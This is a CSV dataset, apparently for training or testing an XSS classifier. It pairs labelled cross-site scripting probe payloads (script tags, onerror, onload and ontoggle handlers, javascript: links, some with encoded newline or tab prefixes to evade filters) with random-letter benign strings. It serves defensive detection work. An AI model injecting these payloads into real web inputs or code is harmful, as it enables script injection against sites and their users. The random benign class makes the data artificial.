payload,label
hVaqzzIOfOxFRD,0
dalUjHeXJul,0
<a href=javascript:prompt(1)>click</a>,1
<script>confirm(1)</script>,1
EbpTWskEsSSY,0
<%0aimg src=x onerror=prompt(1)>,1
<%0ascript>prompt(1)<%0a/script>,1
iaoXebhMLmIxpbgPWTjHHYsmXEhwCWyzdWX,0
<%0adetails ontoggle=confirm()>,1
oDEdLAxfk zRsApZgazqNZJhCgTKLFiJGgxeWM O,0
dYwZMhPYHnLuwQMPmA,0
DE uCrzkp IBzwFhCLXroFORDbglfB,0
sMgxXaCsSqcSi,0
DHgFSMbSdcNKNxpWKXPYOvgkwXUxUox,0
<%0aimg src=x onerror=prompt(1)>,1
<%0asvg onload=prompt(1)>,1
gUSsavxOYNZwkzZBHFNLGosHvQDFAQRoDZwaSvSM,0
<%0asvg onload=confirm(1)>,1
<script>confirm(1)</script>,1
<%09a href=javascript:prompt(1)>click<%09/a>,1
xescWxZUgxqOI,0
<img src=x onerror=confirm(1)>,1
UfalnVvQgDhWMPGkzTjHpXNs,0
<a href=javascript:prompt(1)>click</a>,1
Fx BaDGjYNLAVBRSjLZzGUMl,0
rDMfZWf Ef ,0
SUuHSvYnwlFwAwRpGIeulKfxLaWbNfdC,0
<%09script>confirm(1)<%09/script>,1
<%0adetails ontoggle=confirm()>,1
XKDAOgUKuZNxuCHDbOxODiop,0
<%09script>prompt(1)<%09/script>,1
<%09a href=javascript:prompt(1)>click<%09/a>,1
TwFJJLAuADq VYbQdzxLGk,0
<%09details ontoggle=confirm()>,1
EAEsUbkkMPSySrPxctmnEyjeVFzKd,0
<%09a href=javascript:prompt(1)>click<%09/a>,1
Ab e QNMyBvHXKyFSkNqQNUFYzJiBDNxWXAph,0
IhSIvEYpbxcnaTKx  Apiru,0
<svg onload=prompt(1)>,1
<%09script>prompt(1)<%09/script>,1
N aIYinGxLiecmzklmLlm,0
X SwenIaqDjpaSCYBC,0
nTpZquZpnmTcLYPQVCnMeaHT,0
<%09svg onload=prompt(1)>,1
<svg onload=prompt(1)>,1
<%0aimg src=x onerror=confirm(1)>,1
<%09details ontoggle=confirm()>,1
duPyvjobTcQ ULkfmXAJRLWNauczE,0
YEsEGELfpyBDPdMzWgLOiZSRxtKTLKQvt,0
<%0asvg onload=prompt(1)>,1
EjgzvKfVxYjHu,0
hjNAGDEXHpEHJIxpFQCOcRTlTJeprdCONyuKIp,0
SKtDekVSim,0
wxnUBghxefq,0
oxOqUQcMAZqi NUMf,0
<%0ascript>prompt(1)<%0a/script>,1
fLO YEbxdUxgeAtYcAMmdQDBNdXfdOEtzkjK,0
oEyfOkZCtymXaVwKtsfcp,0
PpIghPZmZfXQPDbWwCwFCrlDrKFoyGI,0
BYtPIBcpXD,0
EuAaGhmlahBpIBRjfeqIzdCTZnTdfUS,0
<%09details ontoggle=confirm()>,1
SzNdcgoNEgvDS,0
sisJCJfJjeySMjqttfTEkyx,0
NEGeJfCVzaQQZwmqyoYJstItTPgEPQWOJxafxJ,0
<details ontoggle=confirm()>,1
QtSlwitynPStkLCTATdbwd,0
<%09svg onload=prompt(1)>,1
oT ughixFblHUttrJHAedWzVr,0
fKXUyDEOFAEShdyhlRuYjUcsCOxKJCSxTuYlpENP,0
<%0aa href=javascript:prompt(1)>click<%0a/a>,1
VvOHloYGoqgEUe,0
<%09script>confirm(1)<%09/script>,1
TdnVvkrcfmuBn,0
DmjTOxaNrVnHRDArcAEKLiGIpuuBsOpC,0
<%0ascript>confirm(1)<%0a/script>,1
<script>prompt(1)</script>,1
hrLXRmQPEWctVyajovMhFrnv wuxVVnBX,0
 i HUHdIRAZLjTwCoYMrCiUJjTUdOwyKFLW,0
<%09a href=javascript:confirm(1)>click<%09/a>,1
beXShXLQpi,0
<img src=x onerror=prompt(1)>,1
<%09img src=x onerror=confirm(1)>,1
<img src=x onerror=prompt(1)>,1
mGDldgFKZUSGtukNuE,0
<%0adetails ontoggle=confirm()>,1
<svg onload=prompt(1)>,1
<img src=x onerror=confirm(1)>,1
<%0adetails ontoggle=confirm()>,1
EodIDXmChFUniAVzClTmtNeSIGTNdWWWDZsEvgKj,0
<%0ascript>confirm(1)<%0a/script>,1
<%0ascript>prompt(1)<%0a/script>,1
JEssAvklZdYLuqbhJLednUrMaQswAqxGPvAKprYy,0
TbpNwIHhVUjdiosveTUqHLAOdQUaeTy,0
<img src=x onerror=prompt(1)>,1
iCDsMA EXMOcBovVIBUcxXTqIqgfwI,0
xfcDjmxkohxgLFgbCHggKIviGqcY,0
plUAIFudqCIODiTYljREgxEqhWSvy,0
<%09img src=x onerror=confirm(1)>,1
YQukvsyZEnkhUOhNjzltCquaWlxUtifQchG,0
ORS QrRNBTDIlmekInnFeWruEvuGA,0
 FOsorJVrxgwJRhijqB,0
<a href=javascript:prompt(1)>click</a>,1
<script>confirm(1)</script>,1
xbqZWrEGGvNNn,0
<script>confirm(1)</script>,1
SRVIYujdWlQMhUfYjymlqYLZtwSlOOFckB,0
<%09img src=x onerror=prompt(1)>,1
aDFHEdUcKphWrxHEuvFGRSmxdWFqsaX,0
<%0aa href=javascript:prompt(1)>click<%0a/a>,1
<%09svg onload=prompt(1)>,1
oPsNImJvfRVVLYco,0
FabYKcGcXwDWkQiqnvQv,0
HLYTOxEwxSKVjYpleUIhNmzmQ,0
<%0ascript>confirm(1)<%0a/script>,1
mIsADSuBwQecJXCnccLvQQB TUzqnDdRrTqtD,0
<%0asvg onload=confirm(1)>,1
<%0aimg src=x onerror=prompt(1)>,1
pGlJDxYmpWDajwoblwmEbJSSmcxkWlTTHubaCXIl,0
MgfffaF wMgjhPzxwmwaZZASgYncAbAMAzyrXMi,0
<%0ascript>prompt(1)<%0a/script>,1
zauGYmJbnUYUxJCeKOQASqxjLIQNhzo,0
 uBs FRTFdohZKkovpPId,0
PgpEirMKeNfTIQLyMhQaZXGzfmzLxJtrIRaour,0
<svg onload=prompt(1)>,1
<%0ascript>prompt(1)<%0a/script>,1
djYbTMieDL,0
nWgnWTIBuJBnlCVFWEJSkLyNb,0
<img src=x onerror=prompt(1)>,1
<%09details ontoggle=confirm()>,1
afgKOvuyguuCj KlDySrlWJMugYQxih,0
ZUIojDZZgAGeviHpCUoxcXSHV,0
<a href=javascript:confirm(1)>click</a>,1
apgitwXGuJR,0
<details ontoggle=confirm()>,1
JoTISvegOhlVCwTcxjEbMBHI,0
<%0aa href=javascript:prompt(1)>click<%0a/a>,1
<details ontoggle=confirm()>,1
<img src=x onerror=confirm(1)>,1
etcywIQDxwshb,0
iqvpoNzcNfmNaYGucOiELdpiCg,0
fvTAvsZQJcNY N KoLySjyYDmT,0
<%0adetails ontoggle=confirm()>,1
<%0ascript>prompt(1)<%0a/script>,1
<details ontoggle=confirm()>,1
YWoRitoejanqfnIZfvwZushliUd,0
gbyFgEgeFxCBNldX,0
<svg onload=prompt(1)>,1
<%09script>prompt(1)<%09/script>,1
flPYKzlHujDsVspQYSfctfODhQg,0
<%09a href=javascript:prompt(1)>click<%09/a>,1
EmUPzKGWEOoSdxyk,0
AWe skLmVFZarFCeyaFt,0
<script>confirm(1)</script>,1
<img src=x onerror=prompt(1)>,1
<a href=javascript:prompt(1)>click</a>,1
yBQmXtYuKrAhSOMbAYyOQOLaJMCwIcJP D,0
ZuRIiKuhGTsduDUlhPiLmgJ,0
mOFpoSfVZRe,0
jAFlqMvXnahtInhRCkkYKdgNBgC,0
<%0aimg src=x onerror=prompt(1)>,1
gMYwIzvsPKyoESlSEzLFVJTVAUHPmRdZlqAKsYYr,0
<%09details ontoggle=confirm()>,1
EnqDB fWkggVTe,0
nLgqRzCKmQmDAhgeoKZWam,0
<%0aa href=javascript:prompt(1)>click<%0a/a>,1
<%0ascript>confirm(1)<%0a/script>,1
<%09script>confirm(1)<%09/script>,1
GQMsLQVJDcRZTswYIQFDBFYpvUZXJxPXQJhjSd,0
<%0aimg src=x onerror=prompt(1)>,1
UqtElZahlWMeDqMSwnkSYCALIIvkYwSTA,0
iFAGyNhFgrTsBUmdaaDlopaAjMbnKazme,0
<%09img src=x onerror=confirm(1)>,1
vdDGWGpabKRJH,0
<img src=x onerror=confirm(1)>,1
<%0adetails ontoggle=confirm()>,1
xrjFTcTJSRuPV,0
<details ontoggle=confirm()>,1
jAJJvWGcZrIBuNjiMVGagIHJYCvUb,0
<%09img src=x onerror=confirm(1)>,1
<%09script>prompt(1)<%09/script>,1
<img src=x onerror=confirm(1)>,1
RQYbLyDpaHCyeqRISIjxzdqd,0
aoReeD BZbNQvW,0
<%0aa href=javascript:prompt(1)>click<%0a/a>,1
<script>prompt(1)</script>,1
<details ontoggle=confirm()>,1
OmUBGlkoxcQROdnjZl,0
FTQVfEWhImRiWnyY,0
rDVhBnsxJGAhLGYzcsUbsi,0
<%0ascript>confirm(1)<%0a/script>,1
<a href=javascript:prompt(1)>click</a>,1
<%0ascript>confirm(1)<%0a/script>,1
<details ontoggle=confirm()>,1
xqZHlSIFYNJUmqIWt,0
zxfncmUiWMEPfMIhnVP,0
rQMMFtlmDRqfPRysNjOiCalLEGCpwtLJLGKySF,0
JierwaykRcPSmIWZ,0
<%0adetails ontoggle=confirm()>,1
pG bLGPPzubtAaOvIMboenYZMRVkOaATOJxiSR,0
a rlnUgCQxwwlBvsaouiDEAlsbkSm ,0
 pusbinWyKfyo mTioAz hKdAjla,0
GdxsgyL yimlmezZjDV,0
NjjOTVyzMMtepJxWFlwdtNypjYQYUsh,0
EnKLABuLKDMdIIuESevavhICYF,0
mxbQSxnhEIePpjCMbvtSNGovZsxY,0
<%0asvg onload=confirm(1)>,1
<%0adetails ontoggle=confirm()>,1
<%0aimg src=x onerror=prompt(1)>,1
GVluCtBiUXezdXkvGjGUpCYgLRqlHCAhIVDqR,0
zhDDFmQpbwJXN,0
<%09img src=x onerror=confirm(1)>,1
dmJAPtsBWwpmftrFzY DWpNVzKpLgcn,0
DzONEgNLptZIjBf,0
<%0aimg src=x onerror=prompt(1)>,1
<%0aimg src=x onerror=confirm(1)>,1
anlFXsaP dclZCygDQKKDnOychOm,0
k umw VLeKPfhV HCjEcqsiHbWRHp zwZxaNp,0
DhqRDXbTZdzrfsjkQtOAfYDpfLsdpkotdWOywCLF,0
sKsRTokjbHTkFZEMmRzGfeRzEQYKdQGQ,0
ZWqQNaGFqhrlJmWDcRXgcTrdEM,0
fW huzFZbOsenVJYKhVPEMoIDUotCR,0
<%0aimg src=x onerror=prompt(1)>,1
moFqEYKVrrTBfFKrVqjlJnUudRHySIpPHGQVK,0
FDv YNEFzZkEZMlEWRFvfdMuaIrBUSkGPiI,0
<%09script>confirm(1)<%09/script>,1
EOVvlnJeIOyIffYPEVLiYAnUr yA,0
<%0aimg src=x onerror=prompt(1)>,1
<img src=x onerror=confirm(1)>,1
<%0ascript>confirm(1)<%0a/script>,1
AbGLlbvrXiGZi,0
<a href=javascript:prompt(1)>click</a>,1
<details ontoggle=confirm()>,1
PrwJKibWucQoIXwdjrO,0
<%09script>prompt(1)<%09/script>,1
HkdLjrHrbRnCH r ELUUnvHFlKPSZPMER,0
JbRRRLbSnfZOhqQtcQrQYGnvuicVPhAmwh,0
<%09a href=javascript:prompt(1)>click<%09/a>,1
GmYNtEWYrKQtv,0
<%0asvg onload=prompt(1)>,1
CZAbKohABmX,0
yxgohBvIdttVagzpKPOYSF,0
<%09img src=x onerror=prompt(1)>,1
MU ncPeFFZZvatUlIwSAQkOewZMKEEfh,0
<%0asvg onload=confirm(1)>,1
<%09svg onload=confirm(1)>,1
VUbSYSMEsLyIMEoxYwykZ,0
FZgXqBXbJcLgDWRZuCVHhxZklCN,0
lTDRMupFrLseC yFGiJaPzjeELLVktOypv,0
<%0aa href=javascript:prompt(1)>click<%0a/a>,1
znGg RCKdfjpNmSgRCnrQAZiapjrWPguvIteMNH,0
ucfihrUSelezPrg EAFpFOmbfSMCAhqCIQCjiut,0
PiurGXOUQAieGhzAOHMSSiGVu,0
pgARVtpUJRbwMdIky,0
<a href=javascript:confirm(1)>click</a>,1
fboXvxYPeNbgGjBIIVg,0
<%0adetails ontoggle=confirm()>,1
<%0adetails ontoggle=confirm()>,1
qplYSrTpRdqhfQUddpPJtEcrtlOIvsHmxrFhjU,0
<svg onload=confirm(1)>,1
OYitbwCgEhn,0
<script>prompt(1)</script>,1
ESkIykKdxabBwPQrySgxZWplrAUU,0
<%0ascript>confirm(1)<%0a/script>,1
eIHaqTrZVJs,0
wjXjOUydcpSFNtkFjJPHgqdXTLhoN BDU,0
<img src=x onerror=confirm(1)>,1
FbEmBP cIYdRgLmvFstzg,0
<%09script>confirm(1)<%09/script>,1
ZRnLOjbnQNA,0
<%0aa href=javascript:prompt(1)>click<%0a/a>,1
wPyoYGlNmmwvnrqxPPSJywFlml,0
<a href=javascript:prompt(1)>click</a>,1
duGmFFhjUfVNYBFtYCpP,0
MEOxXBuauVefGHZQ,0
VlnfmvtmRfT,0
oKETXhbwZYTauiSZLHeulmGZQILid,0
<%0adetails ontoggle=confirm()>,1
<%09details ontoggle=confirm()>,1
<%0asvg onload=prompt(1)>,1
txGeigiikIUNRTEVmtXN hklrRU,0
<%0asvg onload=confirm(1)>,1
<%09script>prompt(1)<%09/script>,1
<%09details ontoggle=confirm()>,1
wRdhoPgVHsRUSdc,0
zXMdodJlcka PxRX,0
HoeNasJmYhNARUsauknpuUGGGf kAqgi,0
VtqGxpWKLAUdQMss raSmKBCfv,0
<%0aa href=javascript:confirm(1)>click<%0a/a>,1
UeItkWdyNeLrkGGwHYvWqgA,0
<a href=javascript:prompt(1)>click</a>,1
<%0asvg onload=prompt(1)>,1
<img src=x onerror=confirm(1)>,1
<script>prompt(1)</script>,1
DtEpmKzuTUNNjfBhZ,0
<script>prompt(1)</script>,1
lCEfEKwitoPOXKVCsmYUgMorQUzSzHZOOCEfanq,0
<%09a href=javascript:prompt(1)>click<%09/a>,1
ECIwteHVryMklSrYFUiwOryAEdJccGeNukzT,0
cCDRftLHbGArAfJZxG xtSJpxp,0
DptaihYQeOLBJ,0
TjGWBhqqxdHoUxnpYWEuxlfnkPbV,0
pmKosH EHUXdOrWHfYsfkUcmNzGdC,0
<script>prompt(1)</script>,1
<%0asvg onload=prompt(1)>,1
lDbFDurOCnFvAHcNYYsQW,0
<details ontoggle=confirm()>,1
 oKwUGItzlgVbRSnvUBYKCOMtZhpIcXY,0
<%09a href=javascript:confirm(1)>click<%09/a>,1
<%0aimg src=x onerror=prompt(1)>,1
KRFgbKQHdz,0
VneiooBSIJILUHcBLCvY QTDoWRQuRbdjSpq,0
<%0aimg src=x onerror=confirm(1)>,1
KxHqgzCgWiwPxwZ,0
euxdVfUBPwwo gPqkvOOntnNhQDnDqe,0
 NgRecaVGbNogeNBKBy,0
<%09script>prompt(1)<%09/script>,1
<%09script>prompt(1)<%09/script>,1
rHxZJiqTsUYuFjqDmZNqWZnDgajGAHLwMkgrdL,0
NNfSqkSUIeTWCEcqcZSUteJavxNP,0
VurDSQdPMWYbKY,0
bPaGFbURATPvomgoMrZigOsJjhTZevwrdBMKuUQ,0
cQxwOiUcGVdzdITBJXIB,0
JQAegXBPuWQXGHtjTvsQUsnjDNCJXVDtK Fpgo,0
<%0ascript>confirm(1)<%0a/script>,1
<%0asvg onload=confirm(1)>,1
HSqZQlqSDqqiGaa,0
oEwZWuDdHkAmAm,0
<%0aimg src=x onerror=confirm(1)>,1
QtwlLruAlGTna cgYGjFWSr,0
iHRubCyJsOQqZ,0
<%0aa href=javascript:prompt(1)>click<%0a/a>,1
HmsDZWOJKJcjwKlpGZcisjpzbRdND,0
<a href=javascript:prompt(1)>click</a>,1
kQWzQfSKsDHLmFuoiziamjLHmppnBzTPDvyRb,0
VhfqaWj DvziCAWwrkHdjDa,0
kDaRAWVStIGLZmkTAt,0
hplP VAWyIVgpWTkmfu,0
t ZNOOiwUlVRNcgxUMYZHnHzMoLg,0
<%0asvg onload=confirm(1)>,1
<%0aa href=javascript:prompt(1)>click<%0a/a>,1
XVJTHXefkIPiLxVymFMGsgiJWk QLWlhPgC,0
ITLOGkvDxxnrvl,0
ciPCHyKgpBSbbUHWSvIspyrxgrE jzigMh,0
<img src=x onerror=confirm(1)>,1
<%0adetails ontoggle=confirm()>,1
<img src=x onerror=confirm(1)>,1
rJYixNZSXqXnocI,0
<%0aimg src=x onerror=prompt(1)>,1
<%09script>confirm(1)<%09/script>,1
syvdajtcMmIdJT,0
cZHvTWrZnAEWLWthnyWqRJQwPbEp,0
<%0aimg src=x onerror=prompt(1)>,1
<%0ascript>prompt(1)<%0a/script>,1
wVlddKjdBnmjGsvztvnjWMduFrMAxkHEwSvmEWz,0
MUkSlfrGRZxAiBDXumaPP CghL AIZBVIQmjYK,0
HuXxNEbyZZBpIUKD sjNcuHalHSECFHnPpblzof,0
<%09img src=x onerror=confirm(1)>,1
SIsWVcunxD,0
<%09script>prompt(1)<%09/script>,1
Vtya qGnZ a,0
mwxalpCTPYvnpskebtyQgB,0
<%0asvg onload=prompt(1)>,1
BFHcnqItEFkACLjlkfWYzdL,0
<%09script>confirm(1)<%09/script>,1
<%0asvg onload=prompt(1)>,1
iqbZDbBHIbujavHOzcCN,0
RjoaRxbDbXZgGDrSvUyZ,0
hBaHcvlubY,0
fEdevKUKjbDC RQwOaGNB,0
<%0aa href=javascript:prompt(1)>click<%0a/a>,1
ipIMSoEwmoWwpFQCqUCrx v,0
<details ontoggle=confirm()>,1
<svg onload=confirm(1)>,1
<%09a href=javascript:confirm(1)>click<%09/a>,1
nIUMLwFHeUbVivaWl,0
<%09details ontoggle=confirm()>,1
<img src=x onerror=prompt(1)>,1
yiwSBtNtHNsKvpPiNxYNk,0
ytFvCJyxskjAQVSNHUNjsqBBRvGTZTZU cLPpMlP,0
HukdUldCIq WhdUiYTyRPyFPPAKsaBxxS,0
<%09a href=javascript:prompt(1)>click<%09/a>,1
<%0aimg src=x onerror=confirm(1)>,1
PdSVEuPXxRazw,0
<svg onload=prompt(1)>,1
<%09script>confirm(1)<%09/script>,1
MMLcMAFLmrItt GJmjNJbhOCOyEqU,0
<%0aa href=javascript:confirm(1)>click<%0a/a>,1
xtqUidVAhEzhXsmSfzju,0
ibrWBJudhwToNYNvAMKXFNgjlrEaPjMBa,0
JLmmkDfaJyHPtzppSmvmrHcXZhTkLCXQkuwkQJrq,0
yTmUITxYZmF,0
<script>confirm(1)</script>,1
<%0aa href=javascript:confirm(1)>click<%0a/a>,1
ZlJoswXkBM a,0
SsORtqjUVbcJitoVjqZUptYwhuuPnf mp,0
<%09script>prompt(1)<%09/script>,1
<svg onload=prompt(1)>,1
aZOPYxcMwbPjLEarWazfzklrdXwazEiz,0
BGuBnzuIBTRLulgwMvYBuqHkVazuJcJQBW,0
<script>confirm(1)</script>,1
<details ontoggle=confirm()>,1
<%0ascript>confirm(1)<%0a/script>,1
<details ontoggle=confirm()>,1
AmChlmpjrCtsueSvestcfCNSoqtrfIf,0
LwmguKhpQkHAo,0
KDlYvCI xsDTXmlCDLgyaMBpFxysMgvxnsjN,0
<%0aimg src=x onerror=confirm(1)>,1
tNmjNsnhQUmByXQCqkDrLHwpPFmcSI,0
<%09img src=x onerror=prompt(1)>,1
<img src=x onerror=confirm(1)>,1
PuqeNJTnexzI,0
sHaIWKdwdcvnCbtHhmawUQyWlcejFXsedws,0
<%0adetails ontoggle=confirm()>,1
EepxMWwHfvzbisIoWueppqrPwtWskZeGdVD,0
OlurwtNsYtqGFrbaRVf,0
TmzlBpZttKaEKECiByhUeqV,0
yeYmeTqwBULWxouFMA aNOWeZsjiPmF,0
qIRhZJFocEkLCoCsSHKLZKetmMKIqSOwKLL,0
rXbxcbwRJIgYXen,0
xthMzmPiUzTxcKW,0
YnZRlYROqn,0
hgZSGGUAHGoVyWhkuYJwOFheGbNHkKhIvofllW P,0
HVzyTAknhXvhIJj FrmRzxPFTrpJAdBttodSJAyo,0
oOmoflzkEQFtOstJtqCuGxBH,0
<svg onload=prompt(1)>,1
<%0aa href=javascript:confirm(1)>click<%0a/a>,1
<script>confirm(1)</script>,1
<%0asvg onload=prompt(1)>,1
XZFqrYtNMRpJtOzVIkmTYdRGQTJCkk gPP,0
<script>confirm(1)</script>,1
qjqtmwVRhBmN,0
<a href=javascript:prompt(1)>click</a>,1
<%0ascript>confirm(1)<%0a/script>,1
iVbYHxnoJywFkWTsWHVg,0
UxHlSuHFHrfj,0
<%0asvg onload=prompt(1)>,1
CriBoivPCwlTHyyekxNukjtZLzXOOQNWvKQ,0
SUQoLCrsIveIxDOPSdGZe,0
dvPWKeMSuitw,0
cJoaXCYoAhB siASdKxhAilBb,0
TEuHdVaWxiIaKtvitqkpRpeOzdNu,0
PlylvucTyOIAwayeDIZ,0
ZgNhFlZvqAkyHhfqOEVZwUtQvIpMRoFLIyQaJ,0
<%09script>confirm(1)<%09/script>,1
<script>prompt(1)</script>,1
<%09img src=x onerror=confirm(1)>,1
<details ontoggle=confirm()>,1
<%09a href=javascript:confirm(1)>click<%09/a>,1
mIXnJcgNuyAjZCzSFOLbFfEnzvOmlYh,0
<%09details ontoggle=confirm()>,1
<img src=x onerror=confirm(1)>,1
<%09svg onload=prompt(1)>,1
okTaGuydCUnnNcLgX,0
EQojgQEghmoP,0
qtNBxQfHESBdg,0
<%0adetails ontoggle=confirm()>,1
PnudOnaYkUN,0
RnUiqSWsfGeFtbeRFbnuyFkWxpuMJDGhF,0
<%09script>confirm(1)<%09/script>,1
<script>prompt(1)</script>,1
vvfUTxvFZy OvvE GvQHiPWKzIl,0
<svg onload=confirm(1)>,1
<script>confirm(1)</script>,1
<%09details ontoggle=confirm()>,1
<%0adetails ontoggle=confirm()>,1
BiEl vkod DtRpnWMcxFtBRuUKuhbIBshtGlMm,0
BbEgidGEmjJwbWAJrwCfS,0
wqIKdAjnekmoKO,0
<%0ascript>prompt(1)<%0a/script>,1
<%09svg onload=confirm(1)>,1
DJhHhTjGqKDdnziyPDwZnMvE,0
YVHmQLZhlBGzBuZrUw,0
<%0ascript>confirm(1)<%0a/script>,1
<script>confirm(1)</script>,1
IVigLE CaUzYSJuRbh,0
eBYhsJyvfcwKBqVVjpqtgaI,0
<script>confirm(1)</script>,1
yCGFpvVRIpfsTLHXdsXmRhqrgrzJDI,0
pViZCtQgnI,0
IZuTvdzCbwQHqQ,0
<img src=x onerror=prompt(1)>,1
<a href=javascript:prompt(1)>click</a>,1
qUpdBnydSk,0
MpscteZllIHPPTHyJNFUvbHgokLBMMXlZwfyZqo,0
<details ontoggle=confirm()>,1
<%09script>prompt(1)<%09/script>,1
MgGpwcCZbRGHVHEJHwfLmfxlEMCsFRRjrw,0
<%09svg onload=confirm(1)>,1
KyNQVoWgprozHknDrwoq,0
Zbj SHxCFQgLhgvsZOJacGkGnEXGfKN,0
<%0ascript>prompt(1)<%0a/script>,1
<%0adetails ontoggle=confirm()>,1
LVTVruNiXBiXzQUvetonMyCHS rqjJbmsQZcesU,0
<script>confirm(1)</script>,1
<%0aimg src=x onerror=confirm(1)>,1
MrFpjouCXtYAKDYacMKHjZg,0
JNzyHspTsfPcocQ,0
<%09img src=x onerror=prompt(1)>,1
<img src=x onerror=prompt(1)>,1
<%09svg onload=confirm(1)>,1
<%09script>prompt(1)<%09/script>,1
RPGalDVvggZr,0
pp BOb sfUjfzdOoYRrtiOGeNHDgaFefbCkY,0
<%0asvg onload=confirm(1)>,1
yWNeAWUaXolLcJOc,0
<%0adetails ontoggle=confirm()>,1
zNdhhWxlQcvpHRJbmegvBplvL,0
<%09svg onload=prompt(1)>,1
<%0asvg onload=confirm(1)>,1
KqAYIvWzEXvVyARESKkFGbzY ,0
ZxYYvLhLupVmkm,0
<%09script>prompt(1)<%09/script>,1
MHKKHiEvZbCVvGoVmR ,0
kfNqiakqLavvuymgYDhiasQD,0
<%09a href=javascript:prompt(1)>click<%09/a>,1
nwKPWFaOYeBQXZPSdVdTsVIy,0
<%0aa href=javascript:confirm(1)>click<%0a/a>,1
<script>confirm(1)</script>,1
xHoZ MEFrBvpvsinJHUEQsX,0
iadUwrEZlreu,0
snZLORuekcEkZbCelXRkhjSsdOXaxSRdZHu,0
<details ontoggle=confirm()>,1
<details ontoggle=confirm()>,1
<%09img src=x onerror=prompt(1)>,1
FYAGLQMkDgGiRPpfWweEoOlpLqOWV,0
pPQX ZZTKmfCqVLe ReVfXNVYh,0
<script>prompt(1)</script>,1
<details ontoggle=confirm()>,1
<svg onload=prompt(1)>,1
<img src=x onerror=prompt(1)>,1
PlbEpRHqqIfNhhY,0
<details ontoggle=confirm()>,1
FXVXsSMKmWjEoOWy,0
<a href=javascript:confirm(1)>click</a>,1
EMBIDHbHfVnrVdegvDRsdJkHIYXHxt,0
JtSkYDWjtn,0
 FOpwUaNCYUiRVZLupoUpQXYrTgFbpVxvmf,0
QxByEUhhkRJQtnDwSPO,0
<%0ascript>confirm(1)<%0a/script>,1
<a href=javascript:prompt(1)>click</a>,1
RzQIzhMQdkebInQ,0
vUnAcklaiyLhBUI,0
QywVCHQblkTRjtpp,0
<%09script>confirm(1)<%09/script>,1
<%09svg onload=prompt(1)>,1
<svg onload=prompt(1)>,1
pONGArXjjhuOxn,0
<%09a href=javascript:confirm(1)>click<%09/a>,1
nWeIKBCjnZzlfeISuCLFZVw,0
vGpYMoFNSqeYnqVHMrlNXXYSASbMxiVVyooT,0
<img src=x onerror=prompt(1)>,1
<a href=javascript:prompt(1)>click</a>,1
BWfXgllsCdXIuAVoryHcDEUkTNs,0
<%09script>prompt(1)<%09/script>,1
kMEjUhKSIFLjscfRjXNzHpKtmP,0
YfGoZydnihZAuUKA wPjGPkotVutyPYwxZ,0
ebApKuflNsiZpuIYkjHVZmXkSEeowl,0
PGzk  KcUptzZJSvdaDGMoVUyGNOiTgfIfFmLCFa,0
GcvflPBrjK,0
<%0asvg onload=confirm(1)>,1
PdyvjykNVcsPzwBSkgyqEkaXvljZeOS,0
mA iXfOLcHkdyhqGPTfVGfdXyjwvoOl,0
<%0aa href=javascript:confirm(1)>click<%0a/a>,1
<%09details ontoggle=confirm()>,1
XWOrUDLDByAUKIgnMTgJEEhRcrbkVbrd,0
<%0asvg onload=confirm(1)>,1
NPjfHJSsHXiQndIbNEyonqjzZBxj Nh,0
KqJZsattFCE,0
JGqOCsDgEJuaM,0
<%09img src=x onerror=prompt(1)>,1
DvIwxlMDVOqIZIwrzt hHTFDllVnYqn bvEge,0
<svg onload=prompt(1)>,1
KmaYPcexpVaFJCPvwOvVWratzFpRNUvji,0
WsNEvsdRDUTTBRbwlCnj,0
<%0aa href=javascript:prompt(1)>click<%0a/a>,1
kWodMnERlqFBixKZvxElMWpU,0
AmfUDIaAyFZlEClCtbEWnrVeowYsGlz,0
DnRkxqyXrwfJgxiUmimoNIqwNRl ayn,0
kuYDFJYriFQlauueCPsINYD,0
<%0ascript>prompt(1)<%0a/script>,1
LY iOBCJKYLmLeE,0
YfeGbDHoBDCOYcTedLGMoegqUODbS,0
<%09script>prompt(1)<%09/script>,1
<%0aimg src=x onerror=prompt(1)>,1
NnSxdgSZN NoaFXZYjoaoCIXoaaAPKGMuwErhwA,0
kqlMe bFHXEGCTtB QvrmeTYmdmiw,0
LSj RsxNSIfAKV  iCUOXXSxnx,0
HqGcvvOdmfeSfHkNHruZUot,0
UfHSghhJCgaJYjTqdAPjxWMBwaevztML lQjGFNI,0
fUxmRmeLstOVWtwHVJGxNSKyqcbhJjIjYCoMT,0
GoFuoOLIbWaUsRZLAVlkfgZzSwk,0
<details ontoggle=confirm()>,1
jpZHCDawRPvepWfWTcJrkUginKMnQjipqp,0
<details ontoggle=confirm()>,1
hDDeXGqEpMsVxBiNBtUhlgGvzFmMi,0
QEmtQbKwfIvbUNaPusFYf,0
